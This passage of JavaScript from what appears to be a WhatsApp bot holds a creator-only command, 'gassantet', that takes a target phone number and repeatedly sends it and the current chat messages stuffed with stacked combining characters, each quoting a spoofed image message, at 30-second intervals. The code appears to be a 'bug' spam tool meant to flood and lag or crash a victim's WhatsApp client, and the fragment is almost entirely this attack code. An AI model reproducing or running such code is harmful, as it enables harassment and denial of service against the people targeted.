            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
        case 'gassantet': {          
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
